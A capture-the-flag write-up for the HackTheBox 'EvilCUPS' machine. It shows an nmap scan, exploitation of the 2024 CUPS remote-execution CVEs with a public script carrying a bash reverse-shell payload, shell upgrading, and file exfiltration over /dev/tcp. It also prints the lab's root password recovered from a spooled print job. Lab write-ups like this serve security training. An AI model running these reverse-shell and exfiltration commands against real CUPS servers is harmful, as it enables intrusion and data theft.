# Nmap
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/EvilCUPS]
└─$ nmap -sC -sV -Pn 10.10.11.40 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 15:09 UTC
Nmap scan report for 10.10.11.40
Host is up (0.53s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)
|_  256 9f:a4:a9:39:11:20:e0:96:ee:c4:9a:69:28:95:0c:60 (ED25519)
631/tcp open  ipp     CUPS 2.4
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Home - CUPS 2.4.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.10 seconds

```

# Page check
![](images/Pasted%20image%2020250725152254.png)
I will explain what is `CUPS` first
```
CUPS stands for Common Unix Printing System. It is a modular, open-source printing system developed by Apple Inc. that allows Unix-like operating systems (including Linux and macOS) to handle printing tasks.
```

# CUPS CVEs
We have get the version of `CUPS 2.4.2`, and also we can find some vulnerable exploits here
![](images/Pasted%20image%2020250725152522.png)

Its CVEs involves:
```
CVE-2024-47176
CVE-2024-47076
CVE-2024-47175
CVE-2024-47177
```
There is a very detailed report of `poc`, if you really want to know the attack chain
```
https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#Remote-Command-Execution-chain
```

In this place, I would check the existed exploited scripts here
```
https://github.com/IppSec/evil-cups
https://github.com/Alie-N/cups-vulnerability-exploit
```

I would prefer to use `Ippsec`'s script here, it works more stable and easy to control
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/EvilCUPS/evil-cups]
└─$ python3 evilcups.py -h                                  
evilcups.py <LOCAL_HOST> <TARGET_HOST> <COMMAND>
                                                                                      
┌──(wither㉿localhost)-[~/Templates/htb-labs/EvilCUPS/evil-cups]
└─$ python3 evilcups.py 10.10.14.5 10.10.11.40 'bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"'
IPP Server Listening on ('10.10.14.5', 12345)
Sending udp packet to 10.10.11.40:631...
Please wait this normally takes 30 seconds...
28 elapsed
target connected, sending payload ...

target connected, sending payload ...
```

Then we can  find the evil printer in the page
![](images/Pasted%20image%2020250725153852.png)
Then just press the `Print test page` button
![](images/Pasted%20image%2020250725153938.png)
Boom! You get the reverse shell as `lp`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/EvilCUPS]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.40] 48458
bash: cannot set terminal process group (1184): Inappropriate ioctl for device
bash: no job control in this shell
lp@evilcups:/$ 

```
Then let's upgrade our shell
```
lp@evilcups:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
lp@evilcups:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
lp@evilcups:/$
```

# Shell as root
By simple enumerating the file system
We can check the `/etc/passwd`
```
lp@evilcups:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
htb:x:1000:1000:htb,,,:/home/htb:/bin/bash
avahi:x:102:110:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
saned:x:103:113::/var/lib/saned:/usr/sbin/nologin
polkitd:x:997:997:polkit:/nonexistent:/usr/sbin/nologin
colord:x:104:114:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
```
There is a user `htb`, but I don't find anything about that account

Then I would like to try `sudo -l`, but nothing here.
```
lp@evilcups:~$ sudo -l
bash: sudo: command not found
```

Then let's come back to the default directory of `lp`
```
lp@evilcups:~$ cd ~
lp@evilcups:~$ pwd
/var/spool/cups/tmp
lp@evilcups:~$ cd ..
lp@evilcups:/var/spool/cups$ ls
ls: cannot open directory '.': Permission denied
lp@evilcups:/var/spool/cups$ cd ..
lp@evilcups:/var/spool$ ls -al
total 24
drwxr-xr-x  6 root root 4096 Sep 30  2024 .
drwxr-xr-x 11 root root 4096 Sep 28  2024 ..
drwxr-xr-x  3 root root 4096 Sep 28  2024 cron
drwx--x---  3 root lp   4096 Jul 25 01:46 cups
drwxr-xr-x  2 lp   lp   4096 Sep 30  2024 lpd
lrwxrwxrwx  1 root root    7 Sep 27  2024 mail -> ../mail
drwx------  2 root root 4096 Feb 22  2023 rsyslog

```
By checking the document of `CUPS`, we found :
![](images/Pasted%20image%2020250725154833.png)

And also, we can find a completed job in the page
![](images/Pasted%20image%2020250725154908.png)

We can access to `/var/spool/cups`, but we can't check what there was.So I would like try `d00001-001` this file
```
lp@evilcups:/var/spool/cups$ cat d00001-001
%!PS-Adobe-3.0
%%BoundingBox: 18 36 577 806
%%Title: Enscript Output
%%Creator: GNU Enscript 1.6.5.90
%%CreationDate: Sat Sep 28 09:31:01 2024
%%Orientation: Portrait
%%Pages: (atend)
```
Then let's copy it to `/tmp` and download it to our local machine
```
lp@evilcups:/var/spool/cups$ cp d00001-001 /tmp
lp@evilcups:/tmp$ cat d00001-001 > /dev/tcp/10.10.14.5/4444
```
Then use nc to get the file
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/EvilCUPS]
└─$ nc -lnvp 4444 > d00001-001
```

Finally we can use `ps2pdf` to check it
![](images/Pasted%20image%2020250725155946.png)
We can use the credit to `su root`

```
root:Br3@k-G!@ss-r00t-evilcups
```

# Description

`EvilCUPS` is all about the recent CUPS exploits that have made a lot of news in September 2024.
